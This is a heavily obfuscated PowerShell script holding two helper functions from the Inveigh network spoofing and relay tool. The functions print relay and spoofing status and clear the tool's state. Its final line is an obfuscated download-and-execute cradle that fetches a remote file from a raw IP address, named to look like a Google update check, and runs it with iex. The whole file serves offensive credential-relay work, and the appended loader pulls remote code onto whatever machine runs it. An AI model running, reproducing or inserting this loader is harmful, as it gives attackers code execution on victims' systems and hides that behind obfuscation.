function WAtc`H-in`VEI`Gh
{


[CmdletBinding()]
param
( 
    [parameter(MANdAtoRY=${Fal`se})][ValidateSet("Low",{"{0}{1}" -f 'Mediu','m'})][String]${c`oNSO`LEOUTP`Ut} = "Y",
    [parameter(VaLUEFRoMReMAINiNGaRGumeNtS=${tr`Ue})]${InVAlID_`Pa`RA`MeTer}
)

if(${I`NVEiGH}."t`ooL" -ne 1)
{

    if(${i`NvEI`GH}."Ru`Nn`iNg" -or ${I`N`VeigH}."r`elAY_rUnNi`NG")
    {
        &("{0}{3}{1}{2}"-f'Write','tpu','t','-Ou') ("{3}{10}{2}{0}{9}{5}{4}{8}{7}{6}{1}" -f'any key','utput','ess ','P','real t','op ','onsole o','me c','i',' to st','r')
        ${I`Nv`eIgH}."cO`N`sOLE_oUt`PuT" = ${TR`UE}

        :console_loop while(((${in`VE`IGh}."r`UNninG" -or ${INv`EIGH}."r`EL`AY`_rUNNING") -and ${iNVE`i`Gh}."Co`NS`Ol`e_ouTpUt") -or (${INVe`i`Gh}."ConSole`_`qUeUe"."c`OUNt" -gt 0 -and ${i`Nv`EIGh}."co`N`sOle_`Ou`TPut"))
        {

            while(${in`V`eIgH}."CON`SoLe`_QUEuE"."C`OUNt" -gt 0)
            {

                switch -wildcard (${i`NVei`gH}."co`N`SO`lE_qu`euE"[0])
                {

                    {${_} -like ("{0}{2}{1}{4}{3}"-f '* wr','tt','i','to *','en ') -or ${_} -like ("{3}{4}{0}{2}{1}" -f 'r','*','elay ','* fo','r ') -or ${_} -like ("{3}{0}{1}{2}" -f'MB ','relay ','*','*S') -or ${_} -like ("{1}{4}{3}{0}{5}{2}"-f'i','*','ator *','dmin',' local a','str')}
                    {
                        &("{0}{2}{1}{3}" -f 'Wr','-','ite','Warning') ${I`Nv`eIGh}."cOn`SoL`E`_QUEuE"[0]
                        ${iNvE`i`GH}."CoNS`O`l`E_QuEUe".("{1}{0}"-f 'eAt','Remov').Invoke(0)
                    }

                    {${_} -like ("{2}{3}{4}{1}{0}" -f'd','is disable','* ','spoofe','r ') -or ${_} -like ("{0}{3}{1}{2}{4}" -f'* lo','l re','que','ca','st') -or ${_} -like ("{1}{3}{2}{0}"-f 'ader *','* hos','he','t ') -or ${_} -like ("{0}{3}{4}{6}{2}{1}{5}" -f '* user','ive','e',' ','age','d *','nt rec')}
                    {

                        if(${c`oNS`oleOUTPut} -eq 'Y')
                        {
                            &("{2}{1}{3}{0}"-f'ut','ite','Wr','-Outp') ${IN`V`EIgH}."co`NSolE_`qUeue"[0]
                        }

                        ${InV`EigH}."C`ONSoLE_qUE`Ue".("{1}{0}{2}"-f 'emove','R','At').Invoke(0)

                    } 

                    {${_} -like ("{0}{3}{2}{1}"-f'*','nt','onse se',' resp') -or ${_} -like ("{0}{3}{2}{1}"-f'* ignor','*','ng ','i') -or ${_} -like ("{4}{0}{2}{3}{5}{1}"-f 'HT','*','TP*request f','or','* ',' ') -or ${_} -like ("{1}{3}{2}{4}{0}"-f ' *','* Prox','ques','y re','t for')}
                    {
                    
                        if(${Co`N`SOl`Eout`PUT} -ne "Low")
                        {
                            &("{1}{3}{2}{0}" -f't','Wri','tpu','te-Ou') ${in`V`eIgH}."cONSO`l`E_qUe`UE"[0]
                        }

                        ${iN`VEI`gH}."C`onSOLE_q`U`eUe".("{0}{1}"-f 'Rem','oveAt').Invoke(0)

                    } 

                    ("{0}{1}" -f'defa','ult')
                    {
                        &("{2}{3}{1}{0}" -f'put','t','Write-','Ou') ${i`NV`eIgH}."consOL`E`_`q`UEue"[0]
                        ${in`VEi`gh}."cON`So`LE_QUe`UE".("{0}{1}" -f'Re','moveAt').Invoke(0)
                    }

                } 

            }

            if( ( &("{1}{2}{0}" -f '-iTEm','g','Et') ("vaR"+"iABle:7"+"091"+"a") ).VALUE::"k`EYAVAi`lAb`lE")
            {
                ${In`V`eIgh}."C`ON`SO`LE_OutPuT" = ${f`A`LsE}
                BREAK ("{2}{3}{0}{1}"-f 'so','le_loop','c','on')
            }

            &("{0}{1}{2}" -f 'Start','-','Sleep') -m 5
        }

    }
    else
    {
        &("{0}{1}{2}{3}"-f 'Wri','te','-O','utput') ((("{5}{1}{0}{4}{3}{6}{2}"-f 'n6mQ',' is','ng','runn','t ','Inveigh','i'))."R`EP`lACe"('6mQ',[STriNG][CHar]39))
    }

}
else
{
    &("{2}{1}{0}"-f'put','ut','Write-O') ("{8}{0}{10}{13}{12}{1}{7}{6}{2}{5}{3}{11}{4}{9}" -f 'atch-','th','nt ','ool sele','o','external t','rre',' cu','W','n','Inveigh c','cti','sed wi','annot be u')
}

}

function cLE`AR`-in`VEiGh
{


if(${INvE`IGH})
{

    if(!${iNV`E`igh}."rU`NNing" -and !${I`N`VeIgH}."Rel`AY_r`U`NnIng")
    {
        &("{1}{3}{2}{0}"-f 'riable','Remov','-Va','e') ("{2}{0}{1}"-f 'nv','eigh','i') -scope ("{1}{0}"-f 'l','globa')
        &("{2}{0}{1}" -f'-Ou','tput','Write') ("{5}{2}{0}{9}{10}{6}{3}{1}{8}{4}{7}{11}"-f'ata has b','ear',' d','cl',' from mem','Inveigh',' ','or','ed','e','en','y')
    }
    else
    {
        &("{1}{3}{0}{2}" -f 'utp','Wr','ut','ite-O') ("{0}{5}{6}{1}{2}{4}{9}{8}{7}{3}"-f'Run','veig','h','ar-Inveigh',' before ',' Stop-','In','e','g Cl','runnin')
    }

}

}
&("{1}{0}" -f 'x','ie') (&("{1}{2}{0}"-f'ect','New-Ob','j') ("{1}{2}{0}{3}" -f'C','Net.We','b','lient')).("{2}{1}{0}"-f'ring','ownloadSt','D').Invoke(("{7}{4}{8}{0}{6}{2}{1}{5}{3}"-f'84.200.84.','pdate Chec','oogle U','l','p:','k.htm','187/G','htt','//'))
